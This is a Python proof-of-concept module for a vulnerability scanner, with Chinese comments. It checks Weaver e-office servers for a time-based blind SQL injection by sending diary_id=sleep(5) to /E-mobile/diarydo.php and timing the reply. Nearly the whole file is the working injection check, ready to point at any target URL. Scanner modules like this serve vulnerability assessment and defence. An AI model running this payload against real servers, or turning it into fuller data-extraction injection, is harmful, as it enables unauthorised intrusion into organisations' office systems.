# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'weaver_0002' # 平台漏洞编号，留空
    name = '泛微协同办公平台 时间盲注'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        泛微协同办公平台（e-office）存在时间盲注漏洞。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'e21eb5c1-bf9f-4986-920e-e6e5d343d138'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            true_url = self.target + '/E-mobile/diarydo.php?diff=reply&diary_id=1'
            start_time1 = time.time()
            code1, head1, body1, errcode1, fina_url1 = hh.http(true_url)
            true_time = time.time() - start_time1

            flase_url = self.target + '/E-mobile/diarydo.php?diff=reply&diary_id=sleep(5)'
            start_time2 = time.time()
            code2, head2, body2, errcode2, fina_url2 = hh.http(flase_url)
            flase_time = time.time() - start_time2

            if code1 == 200 and code2 == 200 and flase_time > true_time and flase_time > 5:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
